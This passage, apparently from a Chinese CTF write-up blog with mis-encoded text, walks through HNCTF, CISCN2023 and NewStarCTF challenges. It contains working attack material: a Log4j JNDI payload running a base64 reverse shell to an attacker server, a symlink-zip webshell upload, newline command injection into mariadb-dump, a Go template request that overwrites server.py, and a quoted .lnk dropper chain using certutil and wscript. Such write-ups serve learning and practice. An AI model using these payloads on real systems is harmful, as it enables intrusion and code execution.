class="variable">$_GET</span>[<span class="string">&#x27;hn&#x27;</span>] &amp;â€®â¦+!!â©â¦&amp; <span class="string">&quot;â€®â¦ Flag!â©â¦ctf&quot;</span> == <span class="variable">$_GET</span>[â€®â¦LAGâ©â¦ctf]) &#123; <span class="comment">//HN! flag!! F</span></span><br><span class="line">        </span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|\fl4g|\\$|&#x27;|\&quot;/i&quot;</span>,<span class="variable">$want</span>)Or <span class="title function_ invoke__">is_file</span>(<span class="variable">$want</span>))</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;HACK!&quot;</span>);</span><br><span class="line">       </span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;Fine!you win&quot;</span>;</span><br><span class="line">                    <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat ./<span class="subst">$want</span>&quot;</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;HACK!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>md5å¼±æ¯”è¾ƒï¼Œæ•°ç»„ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">post --&gt; data[]=<span class="number">0</span>&amp;verify[]=<span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221101183032110-1686150252660.png" alt="image-20221101183032110"></p><p>é›¶å®½åº¦éšå†™ï¼Œï¼Ÿï¼Ÿï¼Ÿï¼Ÿ</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">get --&gt; </span><br><span class="line">    </span><br><span class="line">hn=hn&amp;%E2%<span class="number">80</span>%AE%E2%<span class="number">81</span>%A6LAG%E2%<span class="number">81</span>%A9%E2%<span class="number">81</span>%A6ctf=%E2%<span class="number">80</span>%AE%E2%<span class="number">81</span>%A6%<span class="number">20</span>Flag!%E2%<span class="number">81</span>%A9%E2%<span class="number">81</span>%A6ctf</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|\fl4g|\\$|&#x27;|\&quot;/i&quot;</span>,<span class="variable">$want</span>)Or <span class="title function_ invoke__">is_file</span>(<span class="variable">$want</span>))</span><br></pre></td></tr></table></figure><p>é€šé…ç¬¦ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">post --&gt; want=f*</span><br></pre></td></tr></table></figure><h3 id="HNCTF-2022-WEEK3-logjjjjlogjjjj"><a href="#HNCTF-2022-WEEK3-logjjjjlogjjjj" class="headerlink" title="[HNCTF 2022 WEEK3]logjjjjlogjjjj"></a>[HNCTF 2022 WEEK3]logjjjjlogjjjj</h3><p>å¤ç°ï¼š<a href="https://blog.csdn.net/weixin_47179815/article/details/125654828">https://blog.csdn.net/weixin_47179815/article/details/125654828</a></p><p>æœ¬åœ°ç¯å¢ƒï¼šJDKç‰ˆæœ¬1.8</p><p>æ”»å‡»æµç¨‹</p><ul><li><p>æœåŠ¡å™¨è¿è¡Œæ”»å‡»è„šæœ¬ç”Ÿæˆpayload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,base64(åå¼¹shell)&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A æœåŠ¡å™¨ip</span><br></pre></td></tr></table></figure></li></ul><p><img src="/../images/image-20221101211620970-1686150252661.png" alt="image-20221101211620970"></p><ul><li><p>æœåŠ¡å™¨ç›‘å¬ç«¯å£</p></li><li><p>å‘é€payload</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;jndi:xxx:<span class="comment">//xxxx/xxx&#125;</span></span><br><span class="line">å°†ä¸Šé¢ç”Ÿæˆçš„payloadæ”¾å…¥ï¼ˆä¼˜å…ˆJDKï¼‰</span><br></pre></td></tr></table></figure><p>URLç¼–ç åå‘é€è¯·æ±‚</p><p><img src="/../images/image-20221101211959222-1686150252662.png" alt="image-20221101211959222"></p></li></ul><p>æˆåŠŸè¿æ¥</p><img src="E:\typora img\image-20221101211512855.png" alt="image-20221101211512855" style="zoom:50%;" /><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="ç®€å•ç¼–ç "><a href="#ç®€å•ç¼–ç " class="headerlink" title="ç®€å•ç¼–ç "></a>ç®€å•ç¼–ç </h3><p>å›¾ç‰‡å°¾éƒ¨æœ‰ä¸€ä¸²urlç¼–ç åçš„å­—ç¬¦</p><p><img src="/../images/image-20221102000004428-1686150252663.png" alt="image-20221102000004428"></p><h3 id="HNCTF-2022-Week1-çº¿ä¸‹å•æ€å‡ºé¢˜äººï¼ˆOSINT"><a href="#HNCTF-2022-Week1-çº¿ä¸‹å•æ€å‡ºé¢˜äººï¼ˆOSINT" class="headerlink" title="[HNCTF 2022 Week1]çº¿ä¸‹å•æ€å‡ºé¢˜äººï¼ˆOSINT)"></a>[HNCTF 2022 Week1]çº¿ä¸‹å•æ€å‡ºé¢˜äººï¼ˆOSINT)</h3><p><img src="/../images/image-20221101232202282-1686150252663.png" alt="image-20221101232202282"></p><p>é¦–å…ˆä»Aå›¾ç‰‡ä¸­æå–å‡ºç»çº¬åº¦</p><p><img src="/../images/image-20221101232242899-1686150252663.png" alt="image-20221101232242899"></p><p>å› ä¸ºè¿™ä¸ªç»çº¬åº¦æ˜¯åº¦åˆ†ç§’çš„å½¢å¼ï¼Œéœ€è¦å…ˆè½¬æ¢ä¸ºåº¦æ•°å½¢å¼</p><p>æ ¼å¼è½¬æ¢ï¼š<a href="http://www.gzhatu.com/du2dfm.html">http://www.gzhatu.com/du2dfm.html</a></p><p>å®šä½ï¼š<a href="http://www.gzhatu.com/dingwei.html">http://www.gzhatu.com/dingwei.html</a></p><p><img src="/../images/image-20221101232434815-1686150252663.png" alt="image-20221101232434815"></p><p>Aå›¾ç‰‡ä¸­è¿˜æœ‰ä¸€ä¸ªæç¤º</p><p><img src="/../images/image-20221101232718045-1686150252663.png" alt="image-20221101232718045"></p><p>æ‰€ä»¥å¯ä»¥ç¡®å®šå®šä½æ˜¯æ­£ç¡®çš„ã€‚</p><p>ç„¶åæ ¹æ®ç¬¬äºŒå¼ å›¾ä¸­çš„æ²³æµå¯ä»¥çŸ¥é“æ˜¯å¾€å“ªæ¡è·¯èµ°çš„ã€‚</p><img src="E:\typora img\image-20221101232747393.png" alt="image-20221101232747393" style="zoom:67%;" /><p>ç”¨é«˜å¾·åœ°å›¾å®šä½å˜‰å…´ç”µä¿¡å¤§å¦ï¼Œå¾€é‚£æ¡è·¯æ‰¾ï¼Œæ‰¾åˆ°</p><img src="E:\typora img\image-20221101232627057.png" alt="image-20221101232627057" style="zoom:67%;" /><p>flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(md5(<span class="string">&#x27;å˜‰å…´å¸‚å—æ¹–åŒºç¦¾å…´åŒ—è·¯506å·äºšèŠ¬æ±€ç²¾å“é…’åº—&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest())<span class="comment">#utf-8ç¼–ç </span></span><br></pre></td></tr></table></figure><p>SSCTF{f833a4d17d35ca5da40f087950293d04}</p><p>ä¹Ÿå¯ä»¥ç”¨exifå·¥å…·æŸ¥çœ‹</p><img src="E:\typora img\image-20221101234725942.png" alt="image-20221101234725942" style="zoom: 50%;" /><h3 id="HNCTF-2022-Week1-ä¸‰ç”Ÿä¸‰ä¸–"><a href="#HNCTF-2022-Week1-ä¸‰ç”Ÿä¸‰ä¸–" class="headerlink" title="[HNCTF 2022 Week1]ä¸‰ç”Ÿä¸‰ä¸–"></a>[HNCTF 2022 Week1]ä¸‰ç”Ÿä¸‰ä¸–</h3><p>å¼±å¯†ç çˆ†ç ´ï¼Œå›¾ç‰‡base64éšå†™å¾—åˆ°äºŒç»´ç ï¼Œæ‰«æåç”¨æ …æ å¯†ç è§£å¯†ï¼Œæ¯ç»„å­—æ•°ä¸º3.</p><h3 id="HNCTF-2022-Week1-silly-zip"><a href="#HNCTF-2022-Week1-silly-zip" class="headerlink" title="[HNCTF 2022 Week1]silly_zip"></a>[HNCTF 2022 Week1]silly_zip</h3><p>ä¼ªåŠ å¯†+IHDRä¿®æ”¹</p><h3 id="HNCTF-2022-Week1-piz-galf"><a href="#HNCTF-2022-Week1-piz-galf" class="headerlink" title="[HNCTF 2022 Week1]piz.galf"></a>[HNCTF 2022 Week1]piz.galf</h3><p>ä¸¤æ¬¡é€†åº</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">r&quot;C:\Users\khaz\Downloads\pmb.galf&quot;</span> , <span class="string">&#x27;rb&#x27;</span> ).read()</span><br><span class="line">f2 = <span class="built_in">open</span>(<span class="string">r&quot;C:\Users\khaz\Downloads\flag.bmp&quot;</span> , <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">f2.write(f[ ::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2023 åˆèµ›</title>
      <link href="/2023/05/31/CISCN2023%E5%88%9D%E8%B5%9B/"/>
      <url>/2023/05/31/CISCN2023%E5%88%9D%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="27æ—¥-unzip"><a href="#27æ—¥-unzip" class="headerlink" title="27æ—¥_unzip"></a><strong>27æ—¥_unzip</strong></h2><p>æ‰“å¼€ç½‘ç«™ï¼Œæ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½ç‚¹ï¼Œé…åˆé¢˜ç›®çš„åå­—ï¼Œç›´æ¥ä¸Šä¼ ä¸€ä¸ªè½¯é“¾æ¥æ–‡ä»¶ï¼Œç„¶åå›æ˜¾</p><p><img src="/../images/image-20230528170519886-1686150302067.png" alt="image-20230528170519886"></p><p>å‘ç°åªèƒ½ä¸Šä¼ zipæ–‡ä»¶ï¼Œå¹¶ä¸”ä½¿ç”¨äº†<code>unzip</code>å‘½ä»¤æ¥è§£å‹ç¼©ä¸Šä¼ çš„å‹ç¼©åŒ…ï¼Œæ‰€ä»¥ä¸èƒ½ä½¿ç”¨è·¯å¾„ç©¿è¶Š</p><blockquote><p>å› ä¸º<code>unzip</code>é»˜è®¤ä¼šå¿½è§†æ–‡ä»¶åä¸­<code>../</code></p></blockquote><p><img src="/../images/image-20230528171026375-1686150302067.png" alt="image-20230528171026375"></p><p>ä½†æ˜¯å¯ä»¥é€šè¿‡è½¯é“¾æ¥è¾¾åˆ°è·¯å¾„ç©¿è¶Šçš„åŠŸèƒ½ã€‚</p><p>å…ˆåˆ›å»ºä¸€ä¸ªè½¯é“¾æ¥æŒ‡å‘ç½‘ç«™ç›®å½•ï¼Œå‹ç¼©ä¸º1.zip</p><blockquote><p>zipè¦åŠ ä¸Š-yå‚æ•°ï¼Œæ‰èƒ½ä¿å­˜è½¯é“¾æ¥</p></blockquote><p><img src="/../images/Snipaste_2023-05-28_15-44-03-1686150302068.png" alt="Snipaste_2023-05-28_15-44-03"></p><p>ç„¶åå†åˆ›å»ºä¸€ä¸ªä¸è½¯é“¾æ¥åŒåçš„ç›®å½•ï¼Œå¹¶åœ¨è¯¥ç›®å½•ä¸‹åˆ›å»ºæœ¨é©¬æ–‡ä»¶ï¼Œå°†è¯¥ç›®å½•å‹ç¼©ä¸º2.zip</p><p><img src="/../images/Snipaste_2023-05-28_15-43-44-1686150302068.png" alt="Snipaste_2023-05-28_15-43-44"></p><p>ç„¶åå…ˆä¸Šä¼ 1.zipï¼Œè§£å‹å¾—åˆ°è½¯é“¾æ¥<code>test</code>ï¼Œå†ä¸Šä¼ 2.zipï¼Œè§£å‹å¾—åˆ°testç›®å½•å’Œshell.phpï¼Œå› ä¸ºtestæŒ‡å‘&#x2F;var&#x2F;www&#x2F;html,æ‰€ä»¥shell.phpå®é™…ä¸Šæ˜¯è¢«è§£å‹åˆ°ç½‘ç«™ç›®å½•ä¸‹</p><p><img src="/../images/Snipaste_2023-05-28_15-45-01-1686150302068.png" alt="Snipaste_2023-05-28_15-45-01"></p><p><img src="/../images/Snipaste_2023-05-28_15-45-12-1686150302068.png" alt="Snipaste_2023-05-28_15-45-12"></p><p>æœ€åè®¿é—®ï¼Œæ‰§è¡Œ<code>cat /flag</code>å³å¯</p><p><img src="/../images/Snipaste_2023-05-28_15-45-38-1686150302068.png" alt="Snipaste_2023-05-28_15-45-38"></p><h2 id="dumpit"><a href="#dumpit" class="headerlink" title="dumpit"></a><strong>dumpit</strong></h2><p>è®¿é—®ç½‘ç«™çœ‹åˆ°</p><p><img src="/../images/image-20230528171725614-1686150302068.png" alt="image-20230528171725614"></p><p>å¯ä»¥dumpå’Œquery</p><p>ä¸€å¼€å§‹æ˜¯å¯¹ç€queryæ€¼çš„ï¼Œå› ä¸ºå¯¹dumpä¸ç†Ÿ</p><p><img src="/../images/image-20230528171909470-1686150302069.png" alt="image-20230528171909470"></p><p>æŠŠè¯­å¥æ‰“å°å‡ºæ¥äº†ï¼Œæ‰€ä»¥å¾ˆæ˜æ˜¾å¯ä»¥æ§åˆ¶table_2_queryè¿›è¡Œæ³¨å…¥ï¼Œç„¶åé¢˜ç›®æç¤ºäº†flagåœ¨&#x2F;flagï¼Œæ‰€ä»¥å…ˆå°è¯•å¯ä¸å¯ä»¥å†™æ–‡ä»¶getshellï¼Œå‘ç°ä¸è¡Œï¼ŒæŸ¥äº†ä¸€ä¸‹secure_file_privä¸ºNULLç¡®å®æ˜¯ä¸è¡Œçš„</p><p><img src="/../images/image-20230528172420662-1686150302069.png" alt="image-20230528172420662"></p><p>å°è¯•å †å æ³¨å…¥ï¼Œçœ‹ä¸€ä¸‹èƒ½ä¸èƒ½æ—¥å¿—getshellï¼Œå‘ç°ï¼›åå¼•å·éƒ½è¢«è¿‡æ»¤äº†</p><p><img src="/../images/image-20230528172554485-1686150302069.png" alt="image-20230528172554485"></p><p>æ‰€ä»¥queryè¿™æ¡è·¯å°±èµ°ä¸é€šäº†ã€‚</p><p>ç„¶åæ˜¯dumpï¼Œåœ¨ç½‘ä¸ŠæŸ¥åˆ°</p><p><img src="/../images/image-20230528172802761-1686150302069.png" alt="image-20230528172802761"></p><p><img src="/../images/image-20230528172816727-1686150302069.png" alt="image-20230528172816727"></p><p>çŸ¥é“äº†æ˜¯ä½¿ç”¨ç³»ç»Ÿå‘½ä»¤æ¥dumpï¼Œè¿™é‡Œå°±å­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´</p><p><img src="/../images/image-20230528173216386-1686150302069.png" alt="image-20230528173216386"></p><p>å‚ç…§ç¬”è®°ï¼Œè¿™é‡Œåªç”¨0d%0aå¯ä»¥ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?db=ctf&amp;table_2_dump=%0d%0a cat index.php </span><br></pre></td></tr></table></figure><p>åœ¨hereä¸­å¯ä»¥çœ‹åˆ°æºç </p><p><img src="/../images/image-20230528173600848-1686150302069.png" alt="image-20230528173600848"></p><p>å…³é”®ç‚¹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$black</span> = <span class="string">&#x27;;`*#^$&amp;|&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dump</span>=<span class="string">&#x27;mariadb-dump &#x27;</span>.<span class="variable">$db</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$t2d</span>.<span class="string">&#x27; &gt;./log/&#x27;</span>.<span class="variable">$randstr</span>.<span class="string">&#x27;.log&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$dump</span>);</span><br></pre></td></tr></table></figure><p>ç„¶åé¢˜ç›®ä¸æ˜¯è¯´äº†flagåœ¨&#x2F;flagï¼Œè¯»äº†ä¸€ä¸‹å‘ç°æ²¡ç”¨ï¼Œçœ‹äº†ä¸€ä¸‹æƒé™</p><p><img src="/../images/image-20230528173721850-1686150302069.png" alt="image-20230528173721850"></p><p>å¼€å§‹æƒ³ç€å†™ä¸ªğŸï¼Œä¸Šå»ææƒè¯•è¯•ï¼Œçœ‹äº†ä¸‹ç›®å½•æƒé™ï¼Œåå¼¹shellä¹Ÿå¤±è´¥äº†ï¼ˆéº»äº†ğŸ˜…ï¼‰</p><p><img src="/../images/image-20230528173754533-1686150302069.png" alt="image-20230528173754533"></p><p>åé¢æƒ³åˆ°å¯èƒ½è¢«éª—äº†ï¼Œåœ¨ç¯å¢ƒå˜é‡ä¸­æ‰¾åˆ°äº†flag</p><p><img src="/../images/Snipaste_2023-05-28_15-35-41-1686150302069.png" alt="Snipaste_2023-05-28_15-35-41"></p><h2 id="go-sessionâ€“å¤ç°"><a href="#go-sessionâ€“å¤ç°" class="headerlink" title="go_sessionâ€“å¤ç°"></a>go_sessionâ€“å¤ç°</h2><p>æœ¬åœ°ä¼ªé€ session</p><p><img src="/../images/image-20230608095627395.png" alt="image-20230608095627395"></p><p><img src="/../images/image-20230608095722517.png" alt="image-20230608095722517"></p><p>æµ‹è¯•ä¸€ä¸‹ï¼Œå‘ç°ä¼ªé€ æˆåŠŸäº†</p><p><img src="/../images/image-20230608095852646.png" alt="image-20230608095852646"></p><p><img src="/../images/image-20230608095436931.png" alt="image-20230608095436931"></p><p>django</p><p><img src="/../images/image-20230608104903856.png" alt="image-20230608104903856"></p><p>go</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">func (c *Context) SaveUploadedFile(file *multipart.FileHeader, dst string) error</span><br></pre></td></tr></table></figure><p>SaveUploadedFileä¸Šä¼ è¡¨å•æ–‡ä»¶åˆ°æŒ‡å®šçš„dst</p><p>ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºè¡¨å•nameï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºè¦ä¿å­˜çš„ä½ç½®</p><p>è¯»å–æºç </p><p>payload</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">/admin?name=&#123;%25include+c.Request.Referer()%25&#125;</span><br><span class="line"></span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>E:/test.txt</span><br><span class="line"></span><br><span class="line">/app/server.py</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230608100900686.png" alt="image-20230608100900686"></p><p>å‘ç°å®ƒæ˜¯debugæ¨¡å¼çš„ï¼Œ<strong>çƒ­éƒ¨ç½²ï¼ˆå°±æ˜¯æ¯æ¬¡ä¿®æ”¹ä¹‹åä¼šé‡æ–°ç¼–è¯‘è¿è¡Œä¸€æ¬¡ï¼‰</strong></p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¿›è¡Œè¦†ç›–</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">GET /admin?name=&#123;&#123;c.SaveUploadedFile(c.FormFile(c.ClientIP()),c.Query(c.ClientIP()))&#125;&#125;&amp;<span class="number">118.117</span><span class="number">.49</span><span class="number">.52</span>=/app/server.py HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">124.220</span><span class="number">.192</span><span class="number">.120</span>:<span class="number">8888</span></span><br><span class="line">Content-<span class="type">Type</span>: multipart/form-data; boundary=----WebKitFormBoundary7IWRoUoGnVmsx4c3</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">114.0</span><span class="number">.0</span><span class="number">.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0.8</span>,application/signed-exchange;v=b3;q=<span class="number">0.7</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh,zh-CN;q=<span class="number">0.9</span></span><br><span class="line">Cookie: session-name=MTY4NTE3NzM2NnxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXxY2f3GZVJmQsLELqlORmAjQMLNbC9ZF0rs_HfZqjIRlw==</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: <span class="number">488</span></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary7IWRoUoGnVmsx4c3</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;118.117.49.52&quot;</span>; filename=<span class="string">&quot;server.py&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: text/x-python</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    result = subprocess.run([<span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;/flag&#x27;</span>], stdout=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">return</span> result.stdout.decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__== <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;127.0.0.1&quot;</span>,port=<span class="number">5000</span>,debug=<span class="literal">True</span>)</span><br><span class="line">------WebKitFormBoundary7IWRoUoGnVmsx4c3--</span><br></pre></td></tr></table></figure><p>è¦†ç›–å®Œåï¼Œè®¿é—®<code>/flask?name=</code>ï¼ŒæˆåŠŸè¯»å–åˆ°äº†&#x2F;flag</p><p><img src="/../images/image-20230608102742110.png" alt="image-20230608102742110"></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="pyshell"><a href="#pyshell" class="headerlink" title="pyshell"></a><strong>pyshell</strong></h2><p>ä¸€çœ¼pythonæ²™ç›’é€ƒé€¸</p><p>ç®€å•æµ‹è¯•ä¸€ä¸‹</p><p><img src="/../images/image-20230528175915350-1686150302070.png" alt="image-20230528175915350"></p><p><img src="/../images/image-20230528180007692-1686150302070.png" alt="image-20230528180007692"></p><p>ç»•ä¸€ä¸‹<code>__import__</code>å’Œ<code>system</code></p><p><img src="/../images/image-20230528175941443-1686150302070.png" alt="image-20230528175941443"></p><p>å¯ä»¥ç”¨+æ‹¼æ¥ç»•è¿‡ï¼Œæœ€åç”¨_ç‰¹æ€§å’Œevalå‡½æ•°æ‰§è¡Œå­—ç¬¦ä¸²å³å¯</p><p><img src="/../images/image-20230528180159183-1686150302070.png" alt="image-20230528180159183"></p><p>æœ€åçš„payload</p><p><img src="/../images/image-20230528165834909-1686150302070.png" alt="image-20230528165834909"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NewStarCTF</title>
      <link href="/2023/05/31/NewstarCTF/"/>
      <url>/2023/05/31/NewstarCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="week5"><a href="#week5" class="headerlink" title="week5"></a>week5</h2><h3 id="æœ€åçš„æµé‡åˆ†æ"><a href="#æœ€åçš„æµé‡åˆ†æ" class="headerlink" title="æœ€åçš„æµé‡åˆ†æ"></a>æœ€åçš„æµé‡åˆ†æ</h3><p>å…ˆæŒ‰ç…§æ•°æ®åŒ…å¤§å°æ’åˆ—ï¼Œçœ‹äº†å‡ ä¸ªåŒ…å‘ç°æ˜¯sqlå¸ƒå°”ç›²æ³¨ï¼ˆä¸Šå‘¨çš„sqlæˆ‘ç”¨çš„å°±æ˜¯å¸ƒå°”ç›²æ³¨ï¼‰ã€‚</p><p><img src="/../images/image-20221020130300434-1686150281425.png" alt="image-20221020130300434"></p><p>ä¸Šå›¾ä¸ºæ­£ç¡®å›æ˜¾</p><p>è¿›è¡Œè¿‡æ»¤</p><p><img src="/../images/image-20221020130340038-1686150281425.png" alt="image-20221020130340038"></p><p>ä¸€ä¸ªä¸€ä¸ªæ‰¾å°±è¡Œäº†</p><h3 id="å¥‡æ€ªçš„PDF-2"><a href="#å¥‡æ€ªçš„PDF-2" class="headerlink" title="å¥‡æ€ªçš„PDF 2"></a>å¥‡æ€ªçš„PDF 2</h3><p>ä¸‹è½½ä¸‹æ¥æ˜¯ä¸€ä¸ªå¿«æ·æ–¹å¼ï¼Œæ‰“å¼€æ˜¯ã€Šæ¬ºéª—çš„è‰ºæœ¯ã€‹è¿™æœ¬ä¹¦ã€‚ğŸ˜±</p><p>å®ƒæ˜¯å¿«æ·æ–¹å¼ï¼Œå¾ˆè‡ªç„¶å°±å»çœ‹å®ƒæŒ‡å‘äº†å“ªä¸ªæ–‡ä»¶</p><p><img src="/../images/image-20221020130709420-1686150281425.png" alt="image-20221020130709420"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">%</span><span class="language-bash">SystemRoot%\system32\cmd.exe /c copy <span class="string">&quot;strange2.pdf.lnk&quot;</span> %tmp%\\g5ZokyumBB2gDn.tmp /y</span></span><br><span class="line"></span><br><span class="line">for /r C:\\Windows\\System32\\ %i in (*ertu*.exe) do copy %i %tmp%\\msoia.exe /y</span><br><span class="line"></span><br><span class="line">findstr.exe&quot;TVNDRgAAAA&quot;%tmp%\\g5ZokyumBB2gDn.tmp&gt;%tmp%\\cSi1r0uywDNvDu.tmp&amp;%tmp%\\msoia.ex</span><br></pre></td></tr></table></figure><p>ç„¶åæœç´¢msoia.exeå°±å¾—åˆ°äº†ç±»ä¼¼çš„é¢˜</p><p><a href="https://www.anquanke.com/post/id/267031">https://www.anquanke.com/post/id/267031</a></p><p><a href="https://www.cnblogs.com/hed10ne/p/15841253.html">https://www.cnblogs.com/hed10ne/p/15841253.html</a></p><blockquote><p>ç›®æ ‡çš„æœ€å¤§é•¿åº¦åªæœ‰260ä¸ªå­—ç¬¦ï¼Œè€Œå‘½ä»¤è¡Œå‚æ•°çš„æœ€å¤§é•¿åº¦æ˜¯4096ä¸ªå­—ç¬¦</p></blockquote><p>è¯»å–å®Œæ•´å‘½ä»¤</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> win32com.client <span class="comment"># pip install pywin32</span></span><br><span class="line"></span><br><span class="line">shell = win32com.client.Dispatch(<span class="string">&quot;WScript.Shell&quot;</span>)</span><br><span class="line">shortcut = shell.CreateShortCut(<span class="string">&quot;20200308-sitrep-48-covid-19.pdf.lnk&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(shortcut.Targetpath)</span><br><span class="line"><span class="built_in">print</span>(shortcut.Arguments)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">PS D:\python3<span class="number">.8</span>\code&gt; python -u <span class="string">&quot;d:\python3.8\code\0.py&quot;</span></span><br><span class="line">C:\Windows\System32\cmd.exe</span><br><span class="line">/c copy <span class="string">&quot;strange2.pdf.lnk&quot;</span> %tmp%\\g5ZokyumBB2gDn.tmp /y&amp;<span class="keyword">for</span> /r C:\\Windows\\System32\\ %i <span class="keyword">in</span> (*ertu*.exe) do copy %i %tmp%\\msoia.exe /y&amp;findstr.exe <span class="string">&quot;TVNDRgAAAA&quot;</span> %tmp%\\g5ZokyumBB2gDn.tmp&gt;%tmp%\\cSi1r0uywDNvDu.tmp&amp;%tmp%\\msoia.exe -decode %tmp%\\cSi1r0uywDNvDu.tmp %tmp%\\oGhPGUDC03tURV.tmp&amp;expand %tmp%\\oGhPGUDC03tURV.tmp -F:* %tmp% &amp;wscript %tmp%\\9sOXN6Ltf0afe7.js</span><br></pre></td></tr></table></figure><p><code>oGhPGUDC03tURV.tmp</code>çš„æ–‡ä»¶å¤´æ˜¯MSCFï¼Œæ˜¯å¾®è½¯çš„.cabå‹ç¼©æ–‡ä»¶æ ¼å¼</p><p><img src="/../images/image-20221020131408248-1686150281425.png" alt="image-20221020131408248"></p><p>ä½¿ç”¨å‘½ä»¤<code>expand %tmp%\\oGhPGUDC03tURV.tmp -F:* è§£å‹è·¯å¾„</code>å¾—åˆ°</p><p><img src="/../images/image-20221020131537014-1686150281425.png" alt="image-20221020131537014"></p><p>flagåœ¨flag.txtä¸­</p><p>jsè„šæœ¬</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> e7926b8de13327f8e703624e = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>);e7926b8de13327f8e703624e.<span class="property">Run</span> (<span class="string">&quot;cmd /c mkdir %tmp%\\flag&amp;&amp;move /Y %tmp%\\cSi1r0uywDNvDu.tmp %tmp%\\flag\\flag.txt&amp;\&quot;%tmp%\\strange2.pdf\&quot;&quot;</span>,<span class="number">0</span>);</span><br></pre></td></tr></table></figure><h3 id="Yesec-no-drumsticks-5"><a href="#Yesec-no-drumsticks-5" class="headerlink" 